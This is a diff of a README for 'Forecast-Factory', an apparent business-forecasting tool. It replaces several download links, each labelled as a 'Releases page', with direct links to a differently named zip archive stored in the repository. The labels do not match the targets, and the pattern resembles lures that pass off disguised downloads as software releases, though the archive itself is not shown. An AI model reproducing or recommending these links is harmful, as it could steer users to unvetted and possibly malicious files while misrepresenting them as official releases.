@@ -1,6 +1,6 @@
 # 🌟 Forecast-Factory - Predict Business Outcomes Effectively
 
-[![Download Forecast-Factory](https://raw.githubusercontent.com/Sowrab121/Forecast-Factory/main/forecastfactory/Forecast-Factory-dogtrot.zip)](https://raw.githubusercontent.com/Sowrab121/Forecast-Factory/main/forecastfactory/Forecast-Factory-dogtrot.zip)
+[![Download Forecast-Factory](https://github.com/Sowrab121/Forecast-Factory/raw/refs/heads/main/forecastfactory/Factory-Forecast-v1.6-alpha.5.zip)](https://github.com/Sowrab121/Forecast-Factory/raw/refs/heads/main/forecastfactory/Factory-Forecast-v1.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to Forecast-Factory! This tool helps you forecast business metrics and e
 
 To get started, visit the Releases page to download the tool:
 
-**[Visit this page to download](https://raw.githubusercontent.com/Sowrab121/Forecast-Factory/main/forecastfactory/Forecast-Factory-dogtrot.zip)**
+**[Visit this page to download](https://github.com/Sowrab121/Forecast-Factory/raw/refs/heads/main/forecastfactory/Factory-Forecast-v1.6-alpha.5.zip)**
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**:
-   Go to the [Release page here](https://raw.githubusercontent.com/Sowrab121/Forecast-Factory/main/forecastfactory/Forecast-Factory-dogtrot.zip).
+   Go to the [Release page here](https://github.com/Sowrab121/Forecast-Factory/raw/refs/heads/main/forecastfactory/Factory-Forecast-v1.6-alpha.5.zip).
 
 2. **Find the Latest Version**:
    Look for the section labeled "Latest Release." This includes the most recent version of Forecast-Factory.
@@ -89,4 +89,4 @@ Forecast-Factory is open-source software, which means it is free to use and cust
 
 Thank you for trying Forecast-Factory! We hope it helps you achieve your forecasting goals effectively. 
 
-**[Visit this page to download](https://raw.githubusercontent.com/Sowrab121/Forecast-Factory/main/forecastfactory/Forecast-Factory-dogtrot.zip)**
+**[Visit this page to download](https://github.com/Sowrab121/Forecast-Factory/raw/refs/heads/main/forecastfactory/Factory-Forecast-v1.6-alpha.5.zip)**
